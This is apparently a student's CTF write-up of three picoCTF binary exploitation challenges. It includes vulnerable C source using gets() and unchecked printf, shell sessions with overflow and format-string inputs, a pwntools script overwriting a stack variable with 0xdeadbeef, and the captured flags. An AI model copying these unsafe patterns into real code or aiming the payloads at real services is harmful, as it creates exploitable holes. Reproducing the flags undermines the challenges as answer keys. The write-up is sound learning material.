# buffer overflow 0
To solve this challenge, we had to create a buffer overflow condition so that we could get the flag back. 

## Solution 
To solve this challenge, I followed the steps as listed below: 
- I first read through the code that we found in the challenge, and I tried understanding it. Did not understand the signal part, but rest of it was easy C code so I understood it fairly quickly.
- Next what I did was read through the hints provided in the challenge, and in that I got a hint to read the `BUGS` section of the `gets()` function. Following this hint, I found the official website where CWE-242 was shown. Reading through this page, I realised that basically `gets()` does not have a limit on how many characters I can enter and hence, causes a overflow.
![Website with Demonstrative Example of overflow in gets()](/images/binaryExploitation/Screenshot-2025-10-28-14-10-34.png)  
- So I re-read the code to understand what was happening and I learned that I simply had to put a string with greater than 16 characters to get the answer. This gave me the flag as shown below:
```bash
15:32:07 ishaan-mishra@ishaan-mishra-Lenovo-G505s ~/Downloads  → cat vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
15:32:13 ishaan-mishra@ishaan-mishra-Lenovo-G505s ~/Downloads  → man gets
15:36:22 ishaan-mishra@ishaan-mishra-Lenovo-G505s ~/Downloads  → nc saturn.picoctf.net 54856
Input: ahgfjasj gae hasdhf isadufmasl jahslc naecu gjh aks;ilhfjacdkfhsakh^[l^[g^[jadjlg
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}


^Z
[1]+  Stopped                 nc saturn.picoctf.net 54856
15:40:43 ishaan-mishra@ishaan-mishra-Lenovo-G505s ~/Downloads  → 
```

 ## Flag

 `picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}` 


 ## What I learned 
 #### Existence of functions without proper input sanitization
 From this challenge, I learned how we need to be careful when creating a program to ensure that we do not take input from user which can damage our system. 


 ## References
 - https://play.picoctf.org/practice?page=1&search=buffer%20overflow
 - https://cwe.mitre.org/data/definitions/242.html
 - manpage of `gets()`
----------------------------------------------------------------------------------------------------------------------------------
# Format String 0 
To solve this challenge, we had to use our knowledge of format strings to get to the flag. 

## Solution 
This was a pretty easy solution without much thinking needed. I simply followed the steps as below to get the flag: 
- I first read through the source code to understand what it did. Again, the signal part was confusing, but rest everything was pretty simple to grasp. I understood that we had to use the options on the menu to cause the system to break.
- Reading the hints confirmed this, as the second hint said that you need to try different options. So choosing the strings at random, I got the flag.
```bash
15:47:39 ishaan-mishra@ishaan-mishra-Lenovo-G505s ~/Downloads  → cat * 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
15:47:51 ishaan-mishra@ishaan-mishra-Lenovo-G505s ~/Downloads  → nc mimas.picoctf.net 50686
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}
^Z
[2]+  Stopped                 nc mimas.picoctf.net 50686
15:51:21 ishaan-mishra@ishaan-mishra-Lenovo-G505s ~/Downloads  → 
````

## Flag 

`picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}`


## What I learned 
This was a pretty simple repeat of the previous challenge only, where we can access the flag by simply choosing the right options. I chose the biggest options both the times and got the flag in the first go. 


## References
- https://play.picoctf.org/practice/challenge/433?page=1&search=Format%20String
- Common sense :)
----------------------------------------------------------------------------------------------------------------------------------
# clutter overflow 
To solve this challenge, we first needed to reverse engineer the code that was given to us and understand what exact memory we need to access using the buffer overflow. 

## Solution 
To solve this challenge, I followed the steps as below: 
- I first downloaded the ELF file available in the challenge, along with the C code file to understand what was happening in the program.
- Downloading and reading both these files and understanding the source code, both in Assembly and C, I learned that we first moved the Stack Pointer down by `0x110` bytes (272 in decimal) and then made an input at 8 bytes above this Pointer. So effectively we had to create a buffer of 272 - 8 = 264 to actually reach the memory address where the code variable was stored.
![Image of IDA/objdump](/images/binaryExploitation/Screenshot-2025-10-28-14-17-42.png)
- Now I kind of got stuck here for a while, because I was able to create a buffer, where I could reach the memory address which stored the value, however I was not able to fruitfully manipulate it to get the answer. I initially tried a method I found online on OWasp website about Buffer Overflow, but I realised while writing the code that it would take the input as ASCII characters and not give me the hex I wanted. This is elaborated further in notes.
![Image of OWasp Study](/images/binaryExploitation/Screenshot-2025-10-28-14-10-34.png)
- I then reached out to my mentor where he confirmed my assumption and told me that `\xef\xbe\xad\xde` is parsed like ASCII characters only, meaning it will not write out `0xdeadbeef`.
- My mentor then pointed me in the right direction by introducing me to the `pwntools` library. Honestly, I am both surprised and dumbfounded I made it this far without this library. It made the job of finding the flag soooo easy. I did have to go online and read about what functions can be used to change the code from ASCII to hex, and I also had to read through the repo. It took a while to make the code, but it worked. The function worth mentioning here was the `p32()` function which converts the raw data into 32-bit hex data, which was needed by challenge. We could also have used `p64()` which I realised after solving the challenge.

```bash
13:52:07 ishaan-mishra@ishaan-mishra-Lenovo-G505s ~  → nano exploit.py

  GNU nano 7.2                                                   exploit.py                                                            
#!/usr/bin/env python3
from pwn import *

target = remote('mars.picoctf.net', 31890)


offset = b'A' * 264

newVal = p32(0xdeadbeef)

PAYLOAD = offset + newVal

log.info("Receiving...")
target.recvuntil(b'What do you see?')

log.info("Sending payload...")
target.sendline(PAYLOAD)


log.success("Payload sent. Switching to interactive mode to read the flag!")
target.interactive()






                                                           [ Read 21 lines ]
^G Help         ^O Write Out    ^W Where Is     ^K Cut          ^T Execute      ^C Location     M-U Undo        M-A Set Mark
^X Exit         ^R Read File    ^\ Replace      ^U Paste        ^J Justify      ^/ Go To Line   M-E Redo        M-6 Copy

14:02:36 ishaan-mishra@ishaan-mishra-Lenovo-G505s ~  → chmod a+x exploit.py 
14:02:43 ishaan-mishra@ishaan-mishra-Lenovo-G505s ~  → ./exploit.py
[+] Opening connection to mars.picoctf.net on port 31890: Done
[*] Receiving...
[*] Sending payload...
[+] Payload sent. Switching to interactive mode to read the flag!
[*] Switching to interactive mode

code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to mars.picoctf.net port 31890
14:02:50 ishaan-mishra@ishaan-mishra-Lenovo-G505s ~  → 
```

## Flag 
`picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}` 

## Notes 
So just to briefly discuss this learning from mistake so I don't repeat it again, I ran the same code multiple times thinking why am I getting an error. However, when I actually googled up ASCII values, I realised that by manually writing the input, it would always take the value as ASCII and not hex. I had this epiphany in the morning after getting up and this is what told me to reach out to my mentor. 

## What I learned
#### Usage of both Assembly and C simultaneously
I learned that analyzing both Assembly and C is useful and can increase the rate of finding the flag. This is a really important thing, and from now, I intend on using Ghidra instead of IDA.

#### Existence of pwntools library
This library is honestly a boon and I saw it usage and understanding in this challenge. I could figure out that we needed to create a buffer of 264 bytes yes, but being able to input the next chars as hex directly was proving challengeing. However using these tools, I was not able to insert the chars, but write a simple script which connected to the sit on the corret port, then gave the buffer + chars to get me the flag. It gave me immense relief.

## References
- https://play.picoctf.org/practice?page=1&search=clutter%20overflow
- https://docs.pwntools.com/en/stable/about.html
- https://github.com/Gallopsled/pwntools-tutorial
- Help from mentor
----------------------------------------------------------------------------------------------------------------------------------
